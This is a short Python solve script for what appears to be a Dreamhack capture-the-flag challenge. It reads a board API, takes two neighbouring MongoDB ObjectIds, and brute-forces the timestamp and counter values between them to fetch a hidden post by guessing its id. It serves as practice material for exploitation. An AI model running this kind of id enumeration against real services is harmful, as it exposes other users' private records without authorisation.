import requests, string

port = 9607
url_index = f"http://host3.dreamhack.games:{port}/"
url_board = url_index + "api/board"

r = requests.get(url_board)
start = r.text.index('"_id"')
start = r.text.index('"_id"', start + 1)
end = r.text.index('"_id"', start + 1)
end = r.text.index('"_id"', end + 1)
prevId = r.text[start + 7 : start + 31]
nextId = r.text[end + 7 : end + 31]

cnt = (int(prevId[len(prevId) - 1 :]) + int(nextId[len(prevId) - 1 :])) // 2

timestart = prevId[6:8]
timeend = nextId[6:8]

cand = []
for i in range(int(timestart, 16), int(timeend, 16) + 1):
    cand.append(format(i, "x"))

for c in cand:
    tempid = prevId[:6] + c + prevId[8:23] + f"{cnt}"
    r = requests.get(url_board + "/" + tempid)
    if r.status_code == 200:
        print(r.text)
